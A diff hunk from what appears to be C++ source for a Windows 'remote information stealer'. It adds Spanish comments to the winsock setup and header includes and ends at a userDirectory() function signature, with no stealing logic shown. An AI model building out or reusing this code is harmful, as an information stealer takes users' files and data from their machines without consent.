@@ -1,13 +1,15 @@
-// REMOTE INFORMATION STEALER BY BOUNTYHACKER
+// REMOTE INFORMATION STEALER BY BOUNTYHACKERS
 
+// Usamos las utilidades winsock y no queremos que el compilador se queje de las funcionalidades anteriores utilizadas, 
+// ya que el siguiente código es suficiente para nuestras necesidades.
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
-#pragma comment(lib, "Ws2_32.lib")
-#include <iostream>
-#include <winsock2.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <dirent.h>
-#include <string>
+#pragma comment(lib, "Ws2_32.lib") // Necesitamos la biblioteca Ws2_32.lib para usar la funcionalidad de sockets (redes) en Windows.
+#include <iostream> // incluye utilidades estándar de entrada/salida
+#include <winsock2.h> // incluye utilidades de red
+#include <stdio.h> // incluye utilidades estándar de entrada/salida (necesarias para perror())
+#include <stdlib.h> // incluye utilidades estándar de entrada/salida
+#include <dirent.h> // incluye utilidades de directorio
+#include <string> // incluye utilidades de cadena
 
 
 char* userDirectory() {
